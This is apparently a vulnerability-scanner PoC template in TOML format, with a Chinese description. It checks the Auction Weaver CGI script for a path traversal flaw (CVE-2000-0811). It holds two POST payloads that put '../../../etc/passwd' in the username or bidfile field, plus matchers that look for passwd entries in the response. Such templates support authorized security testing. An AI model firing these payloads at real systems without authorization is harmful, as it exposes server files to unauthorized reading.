[info]
author = "ave"
description = "通过向 Auction Weaver 表单提交包含 ../ 序列的 username 或 bidfile 参数，验证是否存在路径遍历漏洞导致任意文件读取"
id = "POC-AVE-2000-0959"
name = "Auction Weaver 目录遍历 PoC"
severity = "medium"
tags = ["ave-2000-0959"]
vuln_id = [
    "CVE-2000-0811",
    "AVE-2000-0959",
]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/auctionweaver.pl"
protocol = "http"

[poc.requests.body]
content = "username=../../../etc/passwd&password=test"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "nobody:",
    "daemon:",
]

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/auctionweaver.pl"
protocol = "http"

[poc.requests.body]
content = "bidfile=../../../etc/passwd&bid=100"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "root:",
    "nobody:",
    "daemon:",
]
